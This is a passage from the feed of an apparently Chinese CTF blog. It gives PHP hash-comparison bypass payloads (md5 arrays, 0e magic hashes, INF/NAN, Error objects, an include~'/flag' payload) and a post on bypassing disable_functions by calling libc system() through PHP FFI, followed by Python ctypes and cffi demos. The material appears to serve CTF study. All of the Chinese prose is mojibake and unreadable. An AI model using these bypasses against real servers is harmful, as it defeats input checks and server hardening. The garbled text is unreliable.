&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0eçº¯æ•°å­—ç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†å‰:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†åŽï¼š&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INFè¡¨ç¤ºæ— ç©·å¤§ï¼Œè€ŒNANè¡¨ç¤ºä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼ï¼›é™¤äº†ä¸ŽTrueä¹‹å¤–ï¼Œæ‹¿NANä¸Žå…¶ä»–ä»»ä½•å€¼è¿›è¡Œæ¾æ•£æ¯”è¾ƒæˆ–è€…ä¸¥æ ¼æ¯”è¾ƒè¿”å›žç»“æžœéƒ½æ˜¯FALSE
å› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸Žè‡ªèº«åšæ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›žfalse&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INFå’ŒNANç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>åšé¢˜é‡åˆ°çš„&lt;/p>
&lt;p>ç”¨åŽŸç”Ÿç±»&lt;code>Error&lt;/code>ï¼ˆphp7ï¼‰æˆ–&lt;code>Exception&lt;/code>ï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰&lt;code>__toString&lt;/code>æ–¹æ³•ï¼Œè¢«è§¦å‘åŽä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æž„é€ ä¸¤ä¸ªç±»çš„å®žä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«&lt;code>__toString&lt;/code>è°ƒç”¨åŽè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è¿™ä¸ªä¸é‡è¦ æ˜¯é‚£ä¸ªé¢˜çš„payload
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„$aå’Œ$bå†™åˆ°ä¸€è¡Œ&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>æŒ‡é’ˆå–åœ°å€ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item><item><title>FFIç»•è¿‡disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>åºŸè¯ä¸å¤šè¯´ï¼Œç›´æŽ¥è¿›å…¥æ­£é¢˜ï¼›æ–‡ä¸­å‚è€ƒé“¾æŽ¥ç»Ÿä¸€æ‰”åŽé¢äº†&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>é¢„åŠ è½½æ–‡ä»¶åˆ°opcacheä¸­ï¼Œç±»ä¸èƒ½æœ‰ä¸å¯è¾¾çš„çˆ¶ç±»ã€æŽ¥å£ï¼Œalso only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloadedï¼›è¢«åŠ è½½åŽé™¤éžé‡å¯ï¼Œè¿›è¡Œçš„ä¿®æ”¹ä¸å½±å“å½“å‰è¿›ç¨‹ï¼›é¢„åŠ è½½ä¸å½±å“é™æ€ç±»æˆå‘˜å’Œå˜é‡çš„è¡¨çŽ°ï¼›Windowsä¸­ä¸èƒ½é¢„åŠ è½½ä»Žå†…éƒ¨ç»§æ‰¿çš„ç±»ï¼ˆWindows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.ï¼‰ï¼›å¤šç‰ˆæœ¬æœ‰å¯èƒ½é€ æˆbug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>æ–‡æ¡£ä¸­ç»™äº†ä¸€ä¸ªå°æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æŽ¥è¿è¡Œå³å¯è¾“å‡ºHello world!ï¼›è¿™ä¸ªå‡½æ•°çš„åŽŸåž‹æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹¦å†™çš„å½¢å¼ç›¸å½“çš„ç®€æ´ï¼Œåˆ›å»ºFFIå¯¹è±¡ï¼ˆå£°æ˜Žï¼‰-&amp;gt;è°ƒç”¨cæ–¹æ³•ï¼›è¯•ç€ç›´æŽ¥æ‰§è¡Œä¸€ä¸ªwhoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘çŽ°åœ¨æ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œsystemå‡½æ•°ï¼Œçœ‹ä¸‹&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">æºç &lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>è¿™ç§æƒ…å†µä¸‹lib=NULLï¼Œhandle=RTLD_DEFAULTï¼ˆè¿™ä¸ªæ³¨é‡ŠTODOå°±å¾ˆçµæ€§ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>éšåŽè°ƒç”¨&lt;code>DL_FETCH_SYMBOL&lt;/code>ï¼Œ&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">ä¹Ÿå°±æ˜¯&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>å½“dlsymç¬¬ä¸€ä¸ªå‚æ•°ä¸ºRTLD_DEFAULTæ—¶ï¼Œä¼šæŒ‰ç…§é»˜è®¤å…±äº«åº“é¡ºåºæŸ¥æ‰¾systemçš„ä½ç½®ï¼Œæœç´¢èŒƒå›´è¿˜åŒ…æ‹¬äº†å¯æ‰§è¡Œç¨‹åºæžå…¶ä¾èµ–ä¸­çš„å‡½æ•°è¡¨ï¼ˆå¦‚æžœè®¾ç½®äº† RTLD_GLOBALè¿˜ä¼šæœç´¢åŠ¨æ€åŠ è½½åº“ä¸­çš„å‡½æ•°è¡¨ï¼‰ï¼Œä¹Ÿå°±æ˜¯ç›´æŽ¥åœ¨å…¨å±€ç¬¦å·è¡¨é‡Œæ‰¾äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‡å®šåŠ è½½åº“ï¼Œfopenè¿™ç±»å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·&lt;/p>
&lt;p>æ›´å¤šçš„æ —å­è¯·å‚è§&lt;a href="https://wiki.php.net/rfc/ffi">æ–‡æ¡£&lt;/a>å’Œ&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡æ–‡ç« &lt;/a>ï¼Œå†™çš„éƒ½å¾ˆè¯¦ç»†&lt;/p>
&lt;h3 id="è·‘ä¸ªé¢˜ffi-in-python">è·‘ä¸ªé¢˜ï¼šFFI in Python&lt;/h3>
&lt;p>Pythonçš„ä¼˜ç‚¹å°±ä¸å¿…è¯´äº†ï¼Œç¼ºç‚¹æ˜¯å°è£…å¤ªå¥½äº†å¯¼è‡´è¿è¡Œé€Ÿåº¦ä¸Šä¸åŽ»ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æŽ¥åœ¨Pythonä¸­ç”¨C/C++å‘¢ï¼Ÿ&lt;/p>
&lt;p>è‚¥è‚ ä¸é”™çš„æƒ³æ³•ï¼ä¸è¿‡è¦è§£å†³çš„æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šMarshallingï¼ˆæ„Ÿè§‰ç¼–ç»„è¿™ä¸ªç¿»è¯‘å¾ˆå¥‡æ€ª ä½†æ˜¯è¿™ä¸ªè¡Œä¸ºå¯ä»¥ç±»æ¯”ä¸€ä¸‹serializeï¼‰ &amp;amp; Manageing Memoryï¼ˆå†…å­˜ç®¡ç†ï¼‰&lt;/p>
&lt;ul>
&lt;li>Pythonä¸­ä¸‡ç‰©çš†objectï¼Œè€ŒCä¸­æœ‰ä¸¥æ ¼çš„int floatç­‰ç­‰ç±»åž‹&lt;/li>
&lt;li>Pythonæœ‰gcï¼Œè€ŒCä¸­éœ€è¦æ‰‹åŠ¨malloc&lt;/li>
&lt;/ul>
&lt;p>ä¸è¿‡ä¸æ€¥ï¼Œå·²ç»æœ‰åº“å°è£…å¥½äº†è¿™äº›åŠŸèƒ½å¯ä»¥ç›´æŽ¥ä½¿ç”¨ï¼Œæ¥åº·åº·demo&lt;/p>
&lt;h4 id="ctypesåº“">ctypesåº“&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># load the lib&lt;/span>
&lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
$ python3 test.py
In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸè°ƒç”¨äº†cadd.soï¼Œè€Œæˆ‘ä»¬åœ¨pythonä¸­è¦åšçš„åªæœ‰åŠ è½½.so-&amp;gt;è®¾ç½®ç¬¦åˆCæ ‡å‡†çš„è¿”å›žå€¼ç±»åž‹-&amp;gt;è°ƒç”¨ï¼Œè‚¥è‚ çš„ç®€å•&lt;/p>
&lt;p>ä¸è¿‡æ ‡å‡†åº“ctypesæœ‰ä¸€äº›ç¼ºé™· å¹¶ä¸”ä¸èƒ½æ‹“å±•å¤§åž‹é¡¹ç›®ï¼Œé‰´äºŽæ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨cffiåº“&lt;/p>
&lt;h4 id="cffiåº“">cffiåº“&lt;/h4>
&lt;p>è¿™é‡Œæ˜¯ä¸€ä¸ªhello worldçš„å°demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># å¯ä»¥å®šä¹‰å‡½æ•° ç»“æž„ä½“ å˜é‡&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åŠ è½½cå‘½åç©ºé—´&lt;/span>
